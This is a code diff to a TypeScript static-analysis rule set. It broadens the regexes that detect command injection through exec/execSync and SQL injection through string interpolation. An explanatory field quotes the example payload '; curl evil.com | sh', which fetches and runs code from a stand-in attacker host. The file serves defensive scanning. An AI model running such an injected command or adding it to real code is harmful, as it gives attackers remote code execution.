@@ -40,7 +40,7 @@ export const SAST_RULES: SastRule[] = [
     name: "Command Injection via Child Process",
     severity: "critical",
     category: "security",
-    pattern: /\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{[^`]+\}[^`]*`|[a-zA-Z0-9_\.]+\s*\+\s*["'`a-zA-Z0-9_\.])/g,
+    pattern: /\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{[^`]+\}[^`]*`|(?:["'`][^"'`]*["'`]|[a-zA-Z0-9_\.]+)\s*\+\s*(?:["'`][^"'`]*["'`]|[a-zA-Z0-9_\.]+))/g,
     description: "User input or variable concatenation detected inside a shell execution command.",
     whyItMatters: "An attacker who controls this variable can append arbitrary shell commands (e.g. '; curl evil.com | sh') and achieve Remote Code Execution (RCE) on the host machine.",
     suggestedFixTemplate: (matched) =>
@@ -51,7 +51,7 @@ export const SAST_RULES: SastRule[] = [
     name: "SQL Injection via String Concatenation",
     severity: "critical",
     category: "security",
-    pattern: /(?:(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[^\n]*\$\{|\b(?:query|\$queryRawUnsafe|literal)\s*\(\s*`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^`]*\$\{)/i,
+    pattern: /(?:(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[^\n]*(?:\$\{|\#\{|\{[a-zA-Z0-9_]+\})|\b(?:query|\$queryRawUnsafe|literal|execute)\s*\(\s*[`"'][^`"']*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^`"']*(?:\$\{|\#\{|\{[a-zA-Z0-9_]+\}))/i,
     description: "Direct string interpolation detected in a SQL statement.",
     whyItMatters: "Allows attackers to alter SQL query structure, bypass authentication, exfiltrate sensitive database records, or corrupt tables via SQL injection.",
     suggestedFixTemplate: (matched) =>
